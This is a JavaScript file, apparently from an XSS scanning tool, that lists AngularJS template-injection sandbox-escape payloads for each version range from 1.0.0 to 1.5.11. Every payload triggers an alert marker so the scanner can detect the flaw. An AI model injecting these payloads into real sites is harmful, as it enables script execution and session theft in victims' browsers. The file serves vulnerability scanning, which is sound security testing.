xssRadar.scanner.payloads.angular = [
  //1.0.0 - 1.2.5
  "{{constructor.constructor('alert({id})')()}}",
  //1.2.6 - 1.2.18
  "{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert({id})')()}}",
  //1.2.19
  '{{c=toString.constructor;p=c.prototype;p.toString=p.call;["a","alert({id})"].sort(c)}}',
  //1.2.20 - 1.2.29
  '{{a="a"["constructor"].prototype;a.charAt=a.trim;$eval(\'a",alert(alert=1),"\')}}',
  //1.3.0 - 1.5.8
  "{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,alert({id}),a')}}",
  //1.5.9 - 1.5.11
  '{{a=$root;p=[].push;c=p.call;b=p.bind;c.z=$apply;c.$eval=b;a.$$phase=0;a.$digest=toString;C=c.z(c);B=C(b,c,b);$evalAsync("v=pop();v.type=\'UnaryExpression\';v.argument=v.operator=\'alert({id})\';");n=B($$asyncQueue.pop().expression,0,a);m=B(C,0,n);p.apply=m;$eval(\'p(b.c)\');}}</body>'
]
